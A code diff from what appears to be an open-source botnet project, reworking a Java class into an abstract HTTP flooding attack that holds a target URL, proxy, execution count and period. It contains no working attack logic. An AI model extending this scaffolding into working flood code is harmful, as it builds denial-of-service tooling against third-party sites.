@@ -1,7 +1,7 @@
 /*
   The MIT License (MIT)
 
-  Copyright (c) 2016 Giacomo Marciani and Michele Porretta
+  Copyright (c) 2017 Giacomo Marciani and Michele Porretta
 
   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
@@ -24,17 +24,35 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack;
+package com.acmutv.botnet.core.attack.flooding;
 
-import org.quartz.Job;
-import org.quartz.Scheduler;
+import com.acmutv.botnet.core.attack.AbstractAttack;
+import com.acmutv.botnet.core.attack.AttackType;
+import com.acmutv.botnet.tool.net.HttpProxy;
+import com.acmutv.botnet.tool.time.Interval;
+import lombok.Data;
+import lombok.EqualsAndHashCode;
+
+import java.net.URL;
 
 /**
- * An Attack that can be executed by a {@link Scheduler}.
+ * Abstract definition of a general flooding attack.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
  */
-public interface QuartzAttacker extends Job {
+@Data
+@EqualsAndHashCode(callSuper = true)
+public class AbstractFloodAttack extends AbstractAttack implements FloodAttack {
+
+  private int executions;
+
+  private Interval period;
+
+  public AbstractFloodAttack(URL target, HttpProxy proxy, int executions, Interval period) {
+    super(AttackType.FLOOD_HTTP, target, proxy);
+    this.executions = executions;
+    this.period = period;
+  }
 
 }
